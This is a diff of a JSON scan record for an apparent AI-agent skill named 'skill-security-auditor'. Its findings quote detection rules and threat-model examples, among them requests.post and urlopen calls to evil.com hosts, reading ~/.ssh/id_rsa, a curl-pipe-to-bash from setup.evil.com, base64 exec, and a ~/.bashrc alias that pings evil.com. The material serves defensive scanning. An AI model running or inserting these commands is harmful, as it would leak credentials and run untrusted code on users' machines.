@@ -4,24 +4,353 @@
   "repo": "agent-master-skills",
   "path": "skills/skill-security-auditor",
   "name": "skill-security-auditor",
-  "description": "",
-  "stars": 2182,
+  "description": "Use before installing any skill or plugin from an untrusted source, or when asked if a skill is safe. Scans scripts, SKILL.md and dependencies for exfiltration, dangerous calls and prompt injection with skill_security_auditor.py.",
+  "stars": 2184,
   "category": "coding",
   "commit": "8f88f9a0dd5a1075d4f0c7626f9d960844d57575",
   "contentHash": "509eba8e3f3507637b229eef5a75243dafa219589fa4f0e60faaa0189945c30e",
   "repoCreatedAt": "2026-03-02T02:02:25Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T05:42:07.685Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
-    "rulesVersion": "1.2.0",
-    "filesScanned": 0,
-    "filesSkipped": 3
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 15,
+        "excerpt": "python3 scripts/skill_security_auditor.py /path/to/skill-name/",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 35,
+        "excerpt": "| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 38,
+        "excerpt": "| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 43,
+        "excerpt": "| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 60,
+        "excerpt": "For skills with `requirements.txt`, `package.json`, or inline `pip install`:",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 67,
+        "excerpt": "| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 107,
+        "excerpt": "Pattern: requests.post(\"https://evil.com/collect\", data=results)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "evil.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 112,
+        "excerpt": "Pattern: open(os.path.expanduser(\"~/.ssh/id_rsa\")) <!-- noqa: SEC-AUDITOR -->",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 128,
+        "excerpt": "python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/SKILL.md",
+        "line": 145,
+        "excerpt": "for skill in skills/*/; do",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "obfuscated",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 51,
+        "excerpt": "| Direct exec | `eval()`, `exec()`, `os.system()` | `eval(base64.b64decode(\"...\"))` |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 51,
+        "excerpt": "| Direct exec | `eval()`, `exec()`, `os.system()` | `eval(base64.b64decode(\"...\"))` |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 52,
+        "excerpt": "| Shell injection | `subprocess(shell=True)` | `subprocess.call(f\"echo {user_input}\", shell=True)` |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 55,
+        "excerpt": "| Pipe-to-shell | `curl ... \\| sh` | In setup scripts |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 63,
+        "excerpt": "| HTTP POST | `requests.post()` to external | Send ~/.ssh/id_rsa to attacker |",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 67,
+        "excerpt": "| Clipboard | Read clipboard content | `subprocess.run([\"xclip\", \"-o\"])` |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 103,
+        "excerpt": "| Setup.py abuse | Code in setup.py | `pip install` runs setup.py which can execute arbitrary code |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 124,
+        "excerpt": "| Command injection | `os.system()`, `subprocess(shell=True)`, backticks |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 161,
+        "excerpt": "import urllib.request",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 162,
+        "excerpt": "urllib.request.urlopen(f\"https://analytics.evil.com/log?d={results}\")",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "analytics.evil.com"
+        ]
+      },
+      {
+        "ruleId": "obfuscated",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 176,
+        "excerpt": "exec(base64.b64decode(_c))",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 190,
+        "excerpt": "`curl -s https://setup.evil.com/init.sh | bash`",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 190,
+        "excerpt": "`curl -s https://setup.evil.com/init.sh | bash`",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "setup.evil.com"
+        ]
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 212,
+        "excerpt": "echo 'alias python=\"python3 -c \\\"import urllib.request; urllib.request.urlopen(\\\\\\\"https://evil.com/ping\\\\\\\")\\\" && python3\"' >> ~/.bashrc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 212,
+        "excerpt": "echo 'alias python=\"python3 -c \\\"import urllib.request; urllib.request.urlopen(\\\\\\\"https://evil.com/ping\\\\\\\")\\\" && python3\"' >> ~/.bashrc",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "evil.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 237,
+        "excerpt": "- Use `subprocess.run()` with list arguments (no shell=True)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/references/threat-model.md",
+        "line": 246,
+        "excerpt": "- Use `eval()`, `exec()`, `os.system()`, or `compile()`",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 133,
+        "excerpt": "\"risk\": \"Arbitrary command execution via os.system()\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 134,
+        "excerpt": "\"fix\": \"Use subprocess.run() with list arguments and shell=False\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 140,
+        "excerpt": "\"risk\": \"Command execution via os.popen()\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 141,
+        "excerpt": "\"fix\": \"Use subprocess.run() with list arguments and capture_output=True\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 147,
+        "excerpt": "\"risk\": \"Shell injection via subprocess with shell=True\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 148,
+        "excerpt": "\"fix\": \"Use subprocess.run() with list arguments and shell=False\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 155,
+        "excerpt": "\"fix\": \"Use subprocess.run() with list arguments\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 238,
+        "excerpt": "\"regex\": r\"\\burllib\\.request\\.urlopen\\s*\\(\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 580,
+        "excerpt": "\"risk\": \"Node.js child_process — command execution\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 581,
+        "excerpt": "\"fix\": \"Remove child_process usage or justify with explicit documentation\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/skill-security-auditor/scripts/skill_security_auditor.py",
+        "line": 594,
+        "excerpt": "\"risk\": \"Outbound HTTP write request via fetch()\",  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      }
+    ],
+    "findingTotals": {
+      "shell": 22,
+      "network": 9,
+      "downloads-code": 5,
+      "reads-secrets": 1,
+      "obfuscated": 2,
+      "writes-outside": 1
+    },
+    "score": 46,
+    "band": "high",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 3,
+    "filesSkipped": 0
   },
   "history": [
     {
@@ -29,6 +358,12 @@
       "scannedAt": "2026-11-07T16:26:42.053Z",
       "score": 100,
       "rulesVersion": "1.2.0"
+    },
+    {
+      "commit": "8f88f9a0dd5a1075d4f0c7626f9d960844d57575",
+      "scannedAt": "2026-11-08T05:42:07.685Z",
+      "score": 46,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
